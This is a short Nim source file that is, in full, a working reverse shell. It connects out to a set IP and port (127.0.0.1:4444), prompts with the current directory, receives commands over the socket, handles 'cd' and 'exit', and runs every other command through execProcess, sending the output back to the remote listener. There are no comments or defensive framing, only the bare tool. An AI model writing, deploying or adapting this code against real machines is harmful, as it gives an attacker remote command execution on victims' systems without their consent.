import net, os, osproc, strutils

proc executeCommand(command: string): string =
  result = execProcess(command)

var
  socket = newSocket()

var
  myIP = "127.0.0.1"
  myPort = "4444"

let
  exitMessage = "Exiting.."
  changeDirectoryCommand = "cd"
  defaultDirectory = "./"

try:
  socket.connect(myIP, Port(parseInt(myPort)))

  while true:
    socket.send(os.getCurrentDir() & "> ")

    let command = socket.recvLine()

    if command == "exit":
      socket.send(exitMessage)
      break

    if command.strip() == changeDirectoryCommand:
      os.setCurrentDir(defaultDirectory)
    elif command.strip().startswith(changeDirectoryCommand):
      let directory = command.strip().split(' ')[1]
      try:
        os.setCurrentDir(directory)
      except OSError as error:
        socket.send(repr(error) & "\n")
        continue
    else:
      let result = executeCommand(command)
      socket.send(result)

except:
  raise

finally:
  socket.close